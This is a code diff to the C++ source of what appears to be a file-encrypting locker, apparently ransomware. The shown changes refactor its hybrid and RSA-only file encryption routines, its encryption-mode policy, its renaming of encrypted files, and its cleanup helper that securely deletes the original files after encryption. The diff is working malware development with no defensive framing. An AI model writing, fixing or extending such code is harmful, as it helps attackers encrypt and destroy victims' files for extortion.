@@ -57,7 +57,7 @@ static bool HybridMethodStateCrypt(PFILE_INFO FileInfo)
 {
 	if (!filesystem::FileCryptEncrypt(FileInfo))
 	{
-		LOG_ERROR("[CryptEncrypt] Failed; %ls", FileInfo->Filename);
+		LOG_ERROR("[CryptEncrypt] Failed; " log_str, FileInfo->Filename);
 		return false;
 	}
 
@@ -68,7 +68,7 @@ static bool HybridMethodStateDecrypt(PFILE_INFO FileInfo)
 {
 	if (!filesystem::FileCryptDecrypt(FileInfo))
 	{
-		LOG_ERROR("[CryptDecrypt] Failed; %ls", FileInfo->Filename);
+		LOG_ERROR("[CryptDecrypt] Failed; " log_str, FileInfo->Filename);
 		return false;
 	}
 
@@ -80,7 +80,7 @@ static bool RSAOnlyMethodState(PFILE_INFO FileInfo)
 {
 	if (!filesystem::EncryptRSA(FileInfo))
 	{
-		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; %ls", FileInfo->Filename);
+		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; " log_str, FileInfo->Filename);
 		return false;
 	}
 
@@ -373,7 +373,7 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 	switch (state_mode)
 	{
 	case EncryptModes::FULL_ENCRYPT:
-		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeAUTO;
+		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeFULL;
 		break;
 	case EncryptModes::PARTLY_ENCRYPT:
 		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModePARTLY;
@@ -456,10 +456,8 @@ static bool SecureDelete(CONST CHAR* FilePath)
 static bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
 {
 	FileInfo->Filename = data->Filename;
-	if ((FileInfo->newFilename = CryptInfo->name_method
-	(data->Path, data->Filename, data->Exst, data->FullPath)) == NULL)
+	if((FileInfo->newFilename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
 		return false;
-
 	FileInfo->CryptInfo = CryptInfo;
 	FileInfo->FilePath = data->FullPath;
 	FileInfo->padding = 0;
@@ -479,16 +477,33 @@ static bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO*
 
 	if (!filesystem::getParseFile(FileInfo) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed;" log_str, data->Filename);
+		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; " log_str, data->Filename);
 		return false;
 	}
+
 	if (!filesystem::CreateFileOpen(FileInfo) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
 	{
-		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed;" log_str, data->Filename);
+		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; " log_str, data->Filename);
 		return false;
 	}
 
 	return true;
+}
+
+static void free_file_info(PFILE_INFO FileInfo, bool success)
+{
+	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE)
+		api::CloseDesc(FileInfo->FileHandle);
+	if (FileInfo->newFileHandle != INVALID_HANDLE_VALUE)
+		api::CloseDesc(FileInfo->newFileHandle);
+
+	if (!success) SecureDelete(FileInfo->newFilename);
+	else if (global::GetFlagDelete())
+		if (!SecureDelete(FileInfo->FilePath))
+			LOG_ERROR("[SecureDelete] Failed; " log_str, FileInfo->Filename);
+	memory::m_free(FileInfo->newFilename);
+	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
+	memory::memzero_explicit(FileInfo, sizeof(FileInfo));
 }
 
 bool locker::HandlerCrypt
@@ -520,19 +535,7 @@ bool locker::HandlerCrypt
 	LOG_SUCCESS("success encrypt file; " log_str, data->Filename);
 
 END:
-
-	if (FileInfo.FileHandle != INVALID_HANDLE_VALUE)
-		api::CloseDesc(FileInfo.FileHandle);
-	if (FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
-		api::CloseDesc(FileInfo.newFileHandle);
-
-	if (!success) SecureDelete(FileInfo.newFilename);
-	else if (global::GetFlagDelete())
-		if (!SecureDelete(FileInfo.FilePath))
-			LOG_ERROR("[SecureDelete] Failed;" log_str, data->Filename);
-	memory::m_free(FileInfo.newFilename);
-	if (FileInfo.CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo.ctx) memory::m_free(FileInfo.ctx);
-	memory::memzero_explicit(&FileInfo, sizeof(FileInfo));
+	free_file_info(&FileInfo, success);
 	return success;
 }
 
